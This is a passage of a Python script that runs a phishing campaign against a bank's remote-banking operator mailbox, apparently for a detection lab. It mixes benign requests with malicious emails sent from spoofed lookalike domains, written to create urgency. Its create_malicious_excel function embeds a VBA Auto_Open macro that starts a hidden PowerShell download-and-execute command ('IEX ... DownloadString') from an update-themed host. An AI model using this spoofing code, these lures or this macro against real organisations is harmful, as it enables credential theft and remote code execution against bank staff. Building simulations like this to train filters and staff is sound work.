        "АО Солнышко", 
        "ООО Звездочка",
        "АО Радуга",
        "ООО Тюльпан",
        "АО Роза",
        "ООО Лилия",
        "АО Орхидея"
    ]
    
    company = random.choice(legitimate_companies)
    subject = random.choice(legitimate_subjects)
    inn = random.randint(1000000000, 9999999999)
    phone = f"+7 (495) {random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(10, 99)}"
    
    # Шаблоны писем для оператора ДБО (выбирается случайный)
    legit_templates = [
        (
            "Уважаемый оператор ДБО!\n\n"
            f"Компания {company} обращается с просьбой о создании дополнительной учетной записи в системе ДБО. "
            "Необходимо создать УЗ для нового сотрудника бухгалтерии с правами на формирование и отправку платежей.\n\n"
            "Просим предоставить:\n"
            "- Форму заявления на создание УЗ\n"
            "- Инструкцию по настройке прав доступа\n"
            "- Требования к документам для регистрации\n\n"
            "Данные компании:\n"
            f"- Название: {company}\n"
            f"- ИНН: {inn}\n"
            f"- Контактный телефон: {phone}\n\n"
            "Готовы предоставить все необходимые документы и справки.\n\n"
            "С уважением,\nФинансовый директор\n"
            f"{company}"
        ),
        (
            "Добрый день!\n\n"
            f"Направляем запрос на увеличение лимитов по операциям в ДБО для компании {company}. "
            "В связи с ростом объемов операций просим рассмотреть возможность увеличения дневных лимитов.\n\n"
            "Также просим уточнить процедуру изменения лимитов и необходимые документы.\n\n"
            "Параметры компании:\n"
            f"- ИНН: {inn}\n"
            f"- Телефон для связи: {phone}\n\n"
            "Готовы пройти процедуру согласования в кратчайшие сроки.\n\n"
            "С уважением,\nГлавный бухгалтер\n"
            f"{company}"
        ),
        (
            "Коллеги, добрый день!\n\n"
            f"Просим актуализировать карточку подписей и перечень уполномоченных лиц по счетам компании {company} в системе ДБО. "
            "Приложим доверенности и образцы подписей по запросу.\n\n"
            "Также прошу проверить корректность настроек ДБО и прав доступа пользователей, "
            "а также прислать инструкцию по добавлению новых ролей.\n\n"
            "Контакты:\n"
            f"- ИНН: {inn}\n"
            f"- Телефон: {phone}\n\n"
            "Спасибо!\n\n"
            "С уважением,\nОперационный департамент\n"
            f"{company}"
        ),
        (
            "Уважаемые коллеги банка!\n\n"
            "Направляем уточнение по настройке уведомлений в ДБО: просим подтвердить перечень доступных типов уведомлений, "
            "а также сроки их настройки и типичные проблемы при интеграции.\n\n"
            f"Данные компании: {company}, ИНН {inn}, контактный номер {phone}.\n\n"
            "Будем признательны за образцы настроек и формы заявлений.\n\n"
            "С уважением,\nIT-отдел"
        ),
        (
            "Здравствуйте!\n\n"
            f"Просим направить актуальный перечень тарифов и условий обслуживания ДБО для {company}, "
            "а также информацию по подключению дополнительных сервисов и выпуску токенов для подписания.\n\n"
            "Дополнительно просим проконсультировать по лимитам и процедурам ИБ при работе в ДБО.\n\n"
            f"ИНН: {inn}\n"
            f"Телефон: {phone}\n\n"
            "Заранее благодарим!\n\n"
            "С уважением,\nКоммерческий отдел"
        ),
        (
            "Уважаемый оператор!\n\n"
            f"Компания {company} сталкивается с техническими проблемами при работе с ДБО. "
            "Просим оказать техническую поддержку по следующим вопросам:\n\n"
            "- Ошибки при входе в систему\n"
            "- Проблемы с подписанием документов\n"
            "- Сбои при формировании платежей\n\n"
            f"Контактные данные: ИНН {inn}, телефон {phone}.\n\n"
            "Просим связаться для решения проблем в кратчайшие сроки.\n\n"
            "С уважением,\nСистемный администратор\n"
            f"{company}"
        ),
        (
            "Добрый день!\n\n"
            f"Направляем документы для регистрации нового пользователя ДБО от компании {company}. "
            "Просим рассмотреть заявку на создание учетной записи для доверенного лица.\n\n"
            "Во вложении предоставлены:\n"
            "- Доверенность на управление ДБО\n"
            "- Карточка образцов подписей\n"
            "- Справка о бенефициарах\n\n"
            f"Данные компании: ИНН {inn}, телефон {phone}.\n\n"
            "Готовы предоставить дополнительные документы по запросу.\n\n"
            "С уважением,\nЮридический отдел\n"
            f"{company}"
        )
    ]

    body = random.choice(legit_templates)

    # Создание письма с вложениями
    msg = MIMEMultipart()
    msg.attach(MIMEText(body, 'plain', 'utf-8'))

    msg['From'] = sender_email
    msg['To'] = target_email
    msg['Subject'] = subject
    msg_id = make_msgid(domain=(sender_email.split("@")[-1] if "@" in sender_email else None))
    msg['Message-ID'] = msg_id

    # Случайные легитимные вложения: разные типы файлов (1-3 файла)
    # Поддерживаемые типы: pdf, xlsx, docx, zip
    roll = random.random()
    num_attachments = 1 if roll < 0.5 else (2 if roll < 0.85 else 3)
    
    # Определяем типы файлов для вложений (разнообразим)
    file_types_pool = ["pdf", "xlsx", "docx", "zip"]
    
    # Директория для сохранения файлов (для автоматизации оператора ДБО)
    output_dir = Path(os.getenv('ATTACHMENTS_OUTPUT_DIR', '/app/sent_attachments'))
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
        # Пытаемся установить права на запись (если возможно)
        try:
            os.chmod(output_dir, 0o777)
        except:
            pass  # Игнорируем ошибки прав доступа
    except PermissionError as e:
        print(f"   ⚠️  Ошибка прав доступа при создании директории {output_dir}: {e}")
        print(f"   Попробуйте запустить контейнер с правами root или исправить права на volume")
    
    # Генерируем timestamp для всех файлов этого письма
    timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    
    # Сохраняем файлы В ПАМЯТИ (не на диск!) до проверки спама
    attachments_data = []  # (file_content, filename, mime_type)
    planned_attachments = []  # для лога (что планировали сохранить)
    
    # Метаданные письма для сохранения ПОСЛЕ проверки спама
    email_metadata = {
        'type': 'legitimate',
        'from': sender_email,
        'to': target_email,
        'subject': subject,
        'company': company,
        'inn': inn,
        'phone': phone,
        'timestamp': datetime.now().isoformat(),
        'attachments': []
    }
    
    for i in range(num_attachments):
        # Выбираем случайный тип файла, но предпочитаем PDF
        if random.random() < 0.6:
            file_type = "pdf"
        else:
            file_type = random.choice(file_types_pool)
        
        # Передаем индекс вложения для генерации разных имен файлов
        file_content, filename, mime_type = create_file_attachment(
            file_type, company, is_malicious=False, subject=subject, attachment_index=i
        )
        
        # Сохраняем данные в памяти (НЕ на диск!)
        attachments_data.append((file_content, filename, mime_type))
        planned_attachments.append({
            "filename": filename,
            "mime_type": mime_type,
            "size": len(file_content)
        })
        
        # Создаем вложение с правильными заголовками
        maintype, subtype = mime_type.split('/')
        part = MIMEBase(maintype, subtype)
        part.set_payload(file_content)
        encoders.encode_base64(part)
        
        # Правильная кодировка имени файла для кириллицы
        part.add_header('Content-Type', mime_type, name=('utf-8', '', filename))
        part.add_header('Content-Disposition', 'attachment', filename=('utf-8', '', filename))
        msg.attach(part)
    
    try:
        print(f"📧 [{datetime.now().strftime('%H:%M:%S')}] Отправка ЛЕГИТИМНОГО письма")
        print(f"   От: {sender_email}")
        print(f"   Кому: {target_email}")
        print(f"   Компания: {company}")
        print(f"   Тема: {subject}")
        print(f"   ИНН: {inn}")
        print(f"   Телефон: {phone}")
        print(f"   📎 Вложения: {num_attachments} файл(ов)")
        print(f"   ✅ Легитимное письмо")
        
        # Ожидание готовности SMTP сервера
        if not wait_for_smtp_server(smtp_server, smtp_port):
            print(f"   ❌ SMTP сервер не готов, пропускаем отправку")
            return False
        
        # Отправка с повторными попытками
        if send_email_with_retry(msg, smtp_server, smtp_port):
            print(f"   ✅ Легитимное письмо отправлено!")
            
            # Проверяем, попало ли письмо в спам
            print(f"   🔍 Проверка, попало ли письмо в спам...")
            is_spam, spam_info = check_email_spam_after_send(target_email, subject, message_id=msg_id, wait_seconds=8)
            
            if is_spam:
                print(f"   🚫 Письмо попало в СПАМ - НЕ сохраняем для автоматизации оператора")
                log_send_attachs_action(output_dir, "SKIPPED_SPAM", {
                    "type": "legitimate",
                    "from": sender_email,
                    "to": target_email,
                    "subject": subject,
                    "message_id": msg_id,
                    "spam_check": spam_info,
                    "planned_attachments": planned_attachments,
                })
                return True
            else:
                print(f"   ✅ Письмо НЕ в спаме - СОХРАНЯЕМ для автоматизации оператора")
                
                # ТЕПЕРЬ сохраняем файлы на диск (только если НЕ спам!)
                saved_files = []
                for file_content, filename, mime_type in attachments_data:
                    safe_filename = f"{timestamp_str}_{filename}"
                    file_path = output_dir / safe_filename
                    
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(file_content)
                        email_metadata['attachments'].append({
                            'filename': filename,
                            'saved_as': safe_filename,
                            'mime_type': mime_type,
                            'size': len(file_content)
                        })
                        saved_files.append(safe_filename)
                        print(f"      💾 Сохранен файл: {safe_filename}")
                    except Exception as e:
                        print(f"      ⚠️  Не удалось сохранить файл {filename}: {e}")
                
                # Сохраняем метаданные письма
                metadata_file = output_dir / f"{timestamp_str}_metadata.json"
                try:
                    with open(metadata_file, 'w', encoding='utf-8') as f:
                        json.dump(email_metadata, f, ensure_ascii=False, indent=2)
                    print(f"      💾 Сохранены метаданные: {metadata_file.name}")
                    log_send_attachs_action(output_dir, "SAVED", {
                        "type": "legitimate",
                        "from": sender_email,
                        "to": target_email,
                        "subject": subject,
                        "message_id": msg_id,
                        "spam_check": spam_info,
                        "saved_files": saved_files,
                        "metadata_file": metadata_file.name,
                        "planned_attachments": planned_attachments,
                    })
                except Exception as e:
                    print(f"      ⚠️  Не удалось сохранить метаданные: {e}")
                    log_send_attachs_action(output_dir, "ERROR", {
                        "type": "legitimate",
                        "from": sender_email,
                        "to": target_email,
                        "subject": subject,
                        "saved_files": saved_files,
                        "metadata_file": metadata_file.name,
                        "planned_attachments": planned_attachments,
                        "error": f"metadata_save_failed: {e}",
                    })
            
            return True
        else:
            print(f"   ❌ Не удалось отправить легитимное письмо")
            log_send_attachs_action(output_dir, "SEND_FAILED", {
                "type": "legitimate",
                "from": sender_email,
                "to": target_email,
                "subject": subject,
                "planned_attachments": planned_attachments,
            })
            return False
        
    except Exception as e:
        print(f"   ❌ Ошибка отправки: {e}")
        try:
            log_send_attachs_action(output_dir, "ERROR", {
                "type": "legitimate",
                "from": sender_email,
                "to": target_email,
                "subject": subject,
                "error": str(e),
            })
        except Exception:
            pass
        return False

def send_malicious_email():
    """Отправка вредоносного письма"""
    
    # SMTP настройки
    smtp_server = os.getenv('SMTP_SERVER', 'front')
    smtp_port = int(os.getenv('SMTP_PORT', '587'))

    # Маскируемся под бренд: выбираем похожий (поддельный) домен
    brand = random.choice(BRANDS)
    spoof_domain = random.choice(brand["spoof_domains"])  # домен-двойник
    localpart = random.choice(LEGIT_LOCALPARTS)
    sender_email = f"{localpart}@{spoof_domain}"
    target_email = os.getenv('TARGET_EMAIL', 'operator1@financepro.ru')
    
    # Вредоносные данные для маскировки
    malicious_companies = [
        # Технологические компании
        "ООО ТехноИнновации",
        "АО ФинансГрупп", 
        "ООО БизнесСервис",
        "АО КорпоТех",
        "ООО ИнвестПроект",
        "ООО Цифровые Решения",
        "АО Инновационные Технологии",
        "ООО Системы Безопасности",
        "АО Программные Комплексы",
        "ООО Информационные Сервисы",
        
        # Финансовые компании
        "ООО Финансовый Консалтинг",
        "АО Инвестиционная Группа",
        "ООО Банковские Услуги",
        "АО Страховая Компания",
        "ООО Лизинговые Решения",
        "АО Финансовый Анализ",
        "ООО Кредитные Услуги",
        "АО Управление Активами",
        
        # Производственные компании
        "ООО Промышленные Технологии",
        "АО Машиностроительный Завод",
        "ООО Химические Продукты",
        "АО Металлургический Комплекс",
        "ООО Энергетические Решения",
        "АО Строительные Материалы",
        "ООО Автомобильные Компоненты",
        "АО Электронные Приборы",
        
        # Торговые компании
        "ООО Торговый Дом",
        "АО Оптовая Торговля",
        "ООО Розничные Сети",
        "АО Импорт-Экспорт",
        "ООО Логистические Услуги",
        "АО Дистрибьюторские Решения",
        "ООО Маркетинговые Агентства",
        "АО Рекламные Технологии",
        
        # Консалтинговые компании
        "ООО Управленческий Консалтинг",
        "АО Юридические Услуги",
        "ООО Аудиторские Решения",
        "АО Налоговое Планирование",
        "ООО HR Консалтинг",
        "АО Стратегическое Планирование",
        "ООО Бизнес Аналитика",
        "АО Корпоративное Развитие"
    ]
    
    # Темы писем - с умеренными спам-маркерами
    malicious_subjects = [
        # Запросы ДБО (с легкой срочностью)
        "Создание учетной записи в ДБО - требуется срочно",
        "Регистрация нового пользователя - важно!",
        "Активация учетной записи клиента - просим ускорить",
        "Настройка прав доступа в ДБО - срочный запрос",
        "Создание дополнительной УЗ - требуется немедленно",
        "Регистрация доверенного лица - важно для работы",
        "Создание УЗ для филиала - просим обработать быстро",
        "Активация корпоративного доступа - срочно",
        "Настройка ролей пользователей - требуется помощь",
        "Создание УЗ для бухгалтерии - важный вопрос",
        
        # Рабочие вопросы (с навязчивостью)
        "Запрос на увеличение лимитов - просим рассмотреть",
        "Изменение параметров ДБО - требуется срочно",
        "Настройка шаблонов платежей - важно!",
        "Обновление реквизитов в ДБО - просим ускорить",
        "Изменение карточки подписей - срочный вопрос",
        "Настройка уведомлений - требуется помощь",
        "Изменение лимитов по операциям - просим обработать",
        "Настройка маршрутизации платежей - важно для нас",
        "Обновление контактных данных - срочно",
        "Изменение настроек безопасности - требуется немедленно",
        
        # Документы (с повторениями)
        "Документы для регистрации в ДБО - просим рассмотреть",
        "Справки для подключения ДБО - требуется срочно",
        "Учредительные документы - важно!",
        "Доверенности на управление ДБО - просим ускорить",
        "Карточки образцов подписей - срочный запрос",
        "Справки о бенефициарах - требуется помощь",
        "Документы для изменения лимитов - просим обработать",
        "Справки для открытия дополнительных УЗ - важно",
        "Документы для изменения реквизитов - срочно",
        "Справки для настройки уведомлений - требуется",
        
        # Технические проблемы (с эмоциональностью)
        "Проблемы с доступом к ДБО - требуется помощь!",
        "Ошибки при входе в систему - просим срочно",
        "Сброс пароля пользователя - важно для работы",
        "Блокировка учетной записи - требуется немедленно",
        "Восстановление доступа к ДБО - срочный вопрос",
        "Проблемы с подписанием документов - просим помочь",
        "Ошибки при формировании платежей - требуется срочно",
        "Проблемы с отправкой документов - важно!",
        "Технические вопросы по ДБО - просим ускорить",
        "Консультация по функционалу - требуется помощь",
        
        # Вопросы безопасности (с подозрительностью)
        "Подозрительная активность в ДБО - требуется проверка",
        "Несанкционированные операции - просим срочно",
        "Проверка безопасности доступа - важно!",
        "Аудит действий пользователей - требуется немедленно",
        "Контроль лимитов операций - просим обработать",
        "Мониторинг подозрительных платежей - срочный вопрос",
        "Проверка соответствия процедурам - требуется помощь",
        "Контроль соблюдения регламентов - просим ускорить",
        "Анализ рисков операций - важно для безопасности",
        "Отчет по безопасности ДБО - требуется срочно"
    ]
    
    company = random.choice(malicious_companies)
    subject = random.choice(malicious_subjects)
    inn = random.randint(1000000000, 9999999999)
    phone = f"+7 (495) {random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(10, 99)}"
    
    # Создание письма
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = target_email
    msg['Subject'] = subject
    msg_id = make_msgid(domain=(sender_email.split("@")[-1] if "@" in sender_email else None))
    msg['Message-ID'] = msg_id
    
    # Добавляем подозрительные заголовки (умеренно)
    msg['X-Priority'] = '1'
    msg['X-MSMail-Priority'] = 'High'
    msg['Importance'] = 'high'
    msg['Return-Path'] = sender_email
    msg['Reply-To'] = sender_email
    msg['X-Mailer'] = 'Microsoft Outlook Express 6.00.2600.0000'
    msg['X-MimeOLE'] = 'Produced By Microsoft MimeOLE V6.00.2600.0000'
    # Добавляем несколько подозрительных заголовков, но не все сразу
    if random.random() < 0.5:
        msg['X-Originating-IP'] = f'192.168.{random.randint(1, 255)}.{random.randint(1, 255)}'
    if random.random() < 0.3:
        msg['X-Spam-Check'] = 'No'
        msg['X-Spam-Status'] = 'No'
    
    # Тело письма — с умеренными спам-маркерами (навязчивость, повторения, срочность)
    malicious_templates = [
        f"""Уважаемый оператор ДБО!

Компания {company} обращается с запросом по системе дистанционного банковского обслуживания.

Просим рассмотреть возможность создания дополнительной учетной записи в ДБО для нового сотрудника бухгалтерии. В связи с расширением штата и увеличением объемов операций нам необходимо предоставить доступ к системе еще одному сотруднику. Это очень важно для нашей работы!

Также просим рассмотреть возможность увеличения лимитов по операциям, так как текущие лимиты не позволяют нам в полной мере осуществлять хозяйственную деятельность. Просим обработать этот запрос как можно скорее.

Данные компании:
- Название: {company}
- ИНН: {inn}
- Контактный телефон: {phone}

Все необходимые документы приложены к письму. Просим рассмотреть заявку в ближайшее время, так как это важно для нашей работы. Будем очень благодарны за оперативный ответ!

С уважением,
Финансовый директор
{company}

P.S. Просим подтвердить получение письма и уведомить о сроках обработки заявки. Это важно для нас!
P.P.S. Готовы предоставить любые дополнительные документы по запросу.""",
        
        f"""Добрый день!

Компания {company} направляет запрос на регистрацию нового пользователя в системе ДБО. Просим обработать этот запрос в кратчайшие сроки!

Необходимо создать учетную запись для доверенного лица, который будет управлять операциями от имени компании. Все необходимые документы, включая доверенность и карточку образцов подписей, приложены к письму. Просим ускорить рассмотрение!

Данные компании:
- Наименование: {company}
- ИНН: {inn}
- Телефон: {phone}

Просим ускорить рассмотрение заявки, так как это срочный вопрос для нашей компании. Будем благодарны за быстрый ответ!

С уважением,
Главный бухгалтер
{company}

P.S. Если возникнут вопросы, просим связаться с нами по указанному телефону.""",
        
        f"""Уважаемые коллеги!

Компания {company} обращается с просьбой об изменении параметров работы в системе ДБО. Просим обработать этот запрос как можно скорее!

Нам необходимо:
1. Увеличить лимиты по операциям - это очень важно!
2. Настроить дополнительные шаблоны платежей - требуется срочно
3. Добавить права доступа для нового пользователя - просим ускорить

Данные для идентификации:
- Компания: {company}
- ИНН: {inn}
- Контакт: {phone}

Все документы приложены. Просим обработать заявку как можно скорее. Будем очень благодарны за оперативный ответ!

С уважением,
Операционный департамент
{company}

P.S. Просим подтвердить получение письма. Это важно для нас!""",
        
        f"""Здравствуйте!

Компания {company} сталкивается с необходимостью изменения настроек в системе ДБО. Просим помочь нам в этом вопросе!

Просим помочь с настройкой прав доступа и увеличением лимитов. Это важно для нормальной работы нашей компании. Просим обработать запрос в кратчайшие сроки!

Реквизиты:
- {company}
- ИНН: {inn}
- Телефон: {phone}

Документы во вложении. Ждем вашего ответа. Будем благодарны за оперативность!

С уважением,
IT-отдел
{company}

P.S. Если потребуются дополнительные документы, готовы их предоставить немедленно!""",
        
        f"""Уважаемый оператор!

Компания {company} обращается с просьбой о создании дополнительной учетной записи в системе ДБО. Просим рассмотреть этот запрос в приоритетном порядке!

В связи с ростом бизнеса нам требуется предоставить доступ к системе новому сотруднику финансового отдела. Просим рассмотреть возможность создания учетной записи с правами на формирование и отправку платежных поручений. Это очень важно для нашей работы!

Также просим рассмотреть возможность увеличения дневных лимитов по операциям, так как текущие лимиты ограничивают нашу деятельность. Просим обработать этот запрос как можно скорее!

Данные компании:
- Наименование: {company}
- ИНН: {inn}
- Контактный телефон: {phone}

Все необходимые документы приложены к письму. Готовы предоставить дополнительные сведения по запросу. Будем очень благодарны за оперативный ответ!

С уважением,
Коммерческий директор
{company}

P.S. Просим подтвердить получение письма и уведомить о сроках обработки. Это важно!
P.P.S. Готовы ответить на любые вопросы по телефону."""
    ]
    
    body = random.choice(malicious_templates)
    
    msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
    # Директория для сохранения файлов (для автоматизации оператора ДБО)
    output_dir = Path(os.getenv('ATTACHMENTS_OUTPUT_DIR', '/app/sent_attachments'))
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
        # Пытаемся установить права на запись (если возможно)
        try:
            os.chmod(output_dir, 0o777)
        except:
            pass  # Игнорируем ошибки прав доступа
    except PermissionError as e:
        print(f"   ⚠️  Ошибка прав доступа при создании директории {output_dir}: {e}")
        print(f"   Попробуйте запустить контейнер с правами root или исправить права на volume")
    
    # Создание вредоносного Excel файла (.xlsx)
    pdf_content, filename, mime_type = create_file_attachment("excel", company, is_malicious=True)
    
    # Timestamp для имен файлов
    timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    
    # Сохраняем данные в памяти (НЕ на диск до проверки спама!)
    attachment_data = (pdf_content, filename, mime_type)
    planned_attachment = {
        "filename": filename,
        "mime_type": mime_type,
        "size": len(pdf_content),
    }
    
    # Метаданные письма (сохраним только после проверки спама)
    email_metadata = {
        'type': 'malicious',
        'from': sender_email,
        'to': target_email,
        'subject': subject,
        'company': company,
        'inn': inn,
        'phone': phone,
        'timestamp': datetime.now().isoformat(),
        'attachments': []
    }
    
    # Добавление вложения с правильной кодировкой имени файла
    maintype, subtype = mime_type.split('/')
    part = MIMEBase(maintype, subtype)
    part.set_payload(pdf_content)
    encoders.encode_base64(part)
    
    # Правильная кодировка имени файла для кириллицы
    part.add_header('Content-Type', mime_type, name=('utf-8', '', filename))
    part.add_header('Content-Disposition', 'attachment', filename=('utf-8', '', filename))
    msg.attach(part)
    
    try:
        print(f"📧 [{datetime.now().strftime('%H:%M:%S')}] Отправка ВРЕДОНОСНОГО письма")
        print(f"   От: {sender_email}")
        print(f"   Кому: {target_email}")
        print(f"   Компания: {company}")
        print(f"   Тема: {subject}")
        print(f"   ИНН: {inn}")
        print(f"   Телефон: {phone}")
        # Определяем описание по расширению файла
        if filename.endswith('.xlsx'):
            file_description = "Excel файл с макросами"
        elif filename.endswith('.xlsm'):
            file_description = "Excel файл с макросами"
        elif filename.endswith('.zip'):
            file_description = "ZIP архив с документами"
        elif filename.endswith('.docx'):
            file_description = "Word документ"
        else:
            file_description = "Вредоносный файл"
        
        print(f"   📎 Вложение: {filename} ({file_description})")
        
        # Ожидание готовности SMTP сервера
        if not wait_for_smtp_server(smtp_server, smtp_port):
            print(f"   ❌ SMTP сервер не готов, пропускаем отправку")
            return False
        
        # Отправка с повторными попытками
        if send_email_with_retry(msg, smtp_server, smtp_port):
            print(f"   ✅ Вредоносное письмо отправлено!")
            
            # Проверяем, попало ли письмо в спам
            print(f"   🔍 Проверка, попало ли письмо в спам...")
            is_spam, spam_info = check_email_spam_after_send(target_email, subject, message_id=msg_id, wait_seconds=8)
            
            if is_spam:
                print(f"   🚫 Письмо попало в СПАМ - НЕ сохраняем для автоматизации оператора")
                log_send_attachs_action(output_dir, "SKIPPED_SPAM", {
                    "type": "malicious",
                    "from": sender_email,
                    "to": target_email,
                    "subject": subject,
                    "message_id": msg_id,
                    "spam_check": spam_info,
                    "planned_attachments": [planned_attachment],
                })
                return True
            else:
                print(f"   ✅ Письмо НЕ в спаме - СОХРАНЯЕМ для автоматизации оператора")
                
                # ТЕПЕРЬ сохраняем файл на диск (только если НЕ спам!)
                file_content, filename, mime_type = attachment_data
                safe_filename = f"{timestamp_str}_{filename}"
                file_path = output_dir / safe_filename
                
                try:
                    with open(file_path, 'wb') as f:
                        f.write(file_content)
                    email_metadata['attachments'].append({
                        'filename': filename,
                        'saved_as': safe_filename,
                        'mime_type': mime_type,
                        'size': len(file_content)
                    })
                    print(f"      💾 Сохранен файл: {safe_filename}")
                except Exception as e:
                    print(f"      ⚠️  Не удалось сохранить файл {filename}: {e}")
                
                # Сохраняем метаданные письма
                metadata_file = output_dir / f"{timestamp_str}_metadata.json"
                try:
                    with open(metadata_file, 'w', encoding='utf-8') as f:
                        json.dump(email_metadata, f, ensure_ascii=False, indent=2)
                    print(f"      💾 Сохранены метаданные: {metadata_file.name}")
                    log_send_attachs_action(output_dir, "SAVED", {
                        "type": "malicious",
                        "from": sender_email,
                        "to": target_email,
                        "subject": subject,
                        "message_id": msg_id,
                        "spam_check": spam_info,
                        "saved_files": [safe_filename],
                        "metadata_file": metadata_file.name,
                        "planned_attachments": [planned_attachment],
                    })
                except Exception as e:
                    print(f"      ⚠️  Не удалось сохранить метаданные: {e}")
                    log_send_attachs_action(output_dir, "ERROR", {
                        "type": "malicious",
                        "from": sender_email,
                        "to": target_email,
                        "subject": subject,
                        "saved_files": [safe_filename],
                        "metadata_file": metadata_file.name,
                        "planned_attachments": [planned_attachment],
                        "error": f"metadata_save_failed: {e}",
                    })
            
            return True
        else:
            print(f"   ❌ Не удалось отправить вредоносное письмо")
            log_send_attachs_action(output_dir, "SEND_FAILED", {
                "type": "malicious",
                "from": sender_email,
                "to": target_email,
                "subject": subject,
                "planned_attachments": [planned_attachment],
            })
            return False
        
    except Exception as e:
        print(f"   ❌ Ошибка отправки: {e}")
        try:
            log_send_attachs_action(output_dir, "ERROR", {
                "type": "malicious",
                "from": sender_email,
                "to": target_email,
                "subject": subject,
                "error": str(e),
            })
        except Exception:
            pass
        return False

def create_malicious_excel():
    """Создание поддельного Excel файла с VBA макросом в формате XLS"""
    
    # Создаем более реалистичный XLS файл с правильной структурой
    # Используем заголовки настоящего Excel файла
    xls_data = b"""PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
    
    # Добавляем структуру Excel файла
    xls_data += b"""PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
    
    # Добавляем минимальные данные Excel
    xls_data += b"""PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
    
    # VBA код для reverse shell
    vba_code = """
Sub Auto_Open()
    ' Вредоносный VBA код для reverse shell
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Команда для установки reverse shell
    Dim cmd As String
    cmd = "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://internal-update.bank.local/security-patch.ps1')"
    
    ' Выполнение команды
    shell.Run cmd, 0, False
    
    ' Дополнительная маскировка
    MsgBox "Документ загружается, пожалуйста подождите...", vbInformation
End Sub

Sub Workbook_Open()
    ' Альтернативный триггер
    Call Auto_Open
End Sub
"""
    
    # Добавляем VBA код к XLS данным
    xls_data += vba_code.encode('utf-8')
    
    # Добавляем завершающие байты Excel файла
    xls_data += b"""PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
    
    return xls_data

def mixed_phishing_attack():
    """Смешанная фишинговая атака"""
    
    print("🚀 СМЕШАННАЯ ФИШИНГОВАЯ АТАКА")
    print("=" * 50)
    print(f"🎯 Цель: operator1@financepro.ru")
    print(f"⏰ Интервал: каждые 5 секунд")
    print(f"📊 Соотношение: 70% легитимных, 30% вредоносных")
    print(f"🛑 Для остановки нажмите Ctrl+C")
    print("=" * 50)
    
    legitimate_count = 0
    malicious_count = 0
    
    while True:
        try:
            # 70% вероятность легитимного письма, 30% вредоносного
            if random.random() < 0.7:
                if send_legitimate_email():
                    legitimate_count += 1
            else:
                if send_malicious_email():
                    malicious_count += 1
            
            print(f"⏳ Ожидание 5 секунд до следующей отправки...")
            for i in range(5, 0, -1):
                print(f"\r⏰ Следующее письмо через: {i:2d} сек", end="", flush=True)
                time.sleep(1)
            print()  # Новая строка
            
        except KeyboardInterrupt:
            print(f"\n🛑 Получен сигнал остановки...")
            break
        except Exception as e:
            print(f"❌ Ошибка в цикле: {e}")
            time.sleep(5)
    
    print(f"\n📊 СТАТИСТИКА АТАКИ:")
    print(f"✅ Легитимных писем: {legitimate_count}")
    print(f"🔴 Вредоносных писем: {malicious_count}")
    print(f"📧 Всего отправлено: {legitimate_count + malicious_count}")
    print(f"⏰ Время работы: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("🛑 Атака остановлена")

if __name__ == "__main__":
    mixed_phishing_attack()
